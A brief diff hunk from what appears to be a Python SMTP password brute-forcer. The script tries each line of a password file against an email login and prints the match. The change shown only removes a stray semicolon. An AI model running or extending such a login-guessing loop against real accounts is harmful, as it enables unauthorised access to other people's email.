@@ -32,7 +32,7 @@ for password in pwfile:
     try:
         smtpserver.login(user, password)
         print("so the password is ", password)
-        break;
+        break
         
     except smtplib.SMTPAuthenticationError:
         print(password, "is not the password")
